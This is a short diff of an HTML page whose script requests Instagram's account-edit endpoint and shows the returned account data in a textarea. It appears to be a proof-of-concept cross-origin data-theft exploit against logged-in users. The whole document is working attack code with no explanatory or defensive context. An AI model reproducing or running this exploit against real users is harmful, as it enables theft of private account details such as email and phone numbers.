@@ -1,11 +1,11 @@
 <html>
 	<head></head>
-	<body></body>
+	<body><textarea></textarea></body>
 	<script>
 var x = new XMLHttpRequest();
 x.open("GET","https://www.instagram.com/accounts/edit/?__a=1",true);
 x.onreadystatechange = function(){if(x.status==200 && x.readyState ==4)
-	document.body.innerHTML = x.responseText;
+	document.getElementsByTagName('textarea')[0].value = x.responseText;
 };
 x.send();
 </script>
